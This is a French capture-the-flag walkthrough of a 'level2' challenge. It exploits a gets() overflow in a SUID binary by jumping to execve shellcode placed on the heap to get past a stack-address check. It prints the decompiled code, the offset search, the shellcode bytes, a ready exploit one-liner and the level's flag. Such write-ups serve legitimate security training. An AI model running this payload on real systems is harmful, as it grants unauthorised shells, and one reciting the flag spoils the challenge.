# Level2 - Walkthrough

## Objectif
Injecter un shellcode sur le heap et y sauter pour contourner la protection anti-stack.

---

## Étapes d'exploitation

### 1. Reconnaissance
```bash
ls -la
# -rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
# ⚠️ Bit SUID actif → s'exécute avec les droits de level3

./level2
test
# test

python -c "print('A' * 100)" | ./level2
# Segmentation fault → Buffer overflow détecté
```

### 2. Analyse du code (Ghidra)

**Code décompilé** :
```c
void p(void) {
    char local_50[76];
    unsigned int ret_addr;
    
    fflush(stdout);
    gets(local_50);
    
    // Protection anti-stack
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        _exit(1);
    }
    
    puts(local_50);
    strdup(local_50);  // Copie sur le heap
}
```

**Observation** : Protection bloque les adresses commençant par `0xb` (stack/libc).

### 3. Trouver l'adresse heap avec ltrace

```bash
echo "AAAA" | ltrace ./level2
```

**Chercher la ligne** :
```
strdup("AAAA") = 0x0804a008
                 ^^^^^^^^^^
                 Adresse heap
```

**Adresse heap : `0x0804a008`** (ne commence pas par `0xb` → pas bloquée ✅)

### 4. Déterminer l'offset

#### Pattern cyclique
```bash
gdb level2
(gdb) run
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A...
^D

Program received signal SIGSEGV
(gdb) info registers eip
# eip  0x41366441  → "dA6A" en ASCII
```

**Chercher "dA6A" dans le pattern → position 80**

#### Vérification
```bash
(gdb) run
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
^D
(gdb) info registers eip
# eip  0x42424242  → "BBBB" ✅
```

**Offset = 80 octets**

### 5. Vérifier la protection

```bash
python -c "print('A'*80 + '\xbf\xff\xff\xbf')" | ./level2
# (0xbfffffbf)  ← Protection détecte l'adresse stack ✅
```

### 6. Construction du payload

**Structure** :
```
[Shellcode 21 octets][Padding 59 octets][Adresse heap 4 octets]
```

**Calcul du padding** :
```
Offset = 80
Shellcode = 21
Padding = 80 - 21 = 59
```

**Shellcode (21 octets)** : `execve("/bin/sh", NULL, NULL)`
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

**Adresse heap en little-endian** :
```
0x0804a008 → \x08\xa0\x04\x08
```

### 7. Exploitation

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

**Résultat** :
```
$ whoami
level3

$ id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users)
```

### 8. Récupération du flag

```bash
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

## Flag
```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Type de vulnérabilité
- Buffer overflow (CWE-120)
- Use of dangerous function `gets()` (CWE-676)
- ret2heap exploitation
- SUID privilege escalation (CWE-250)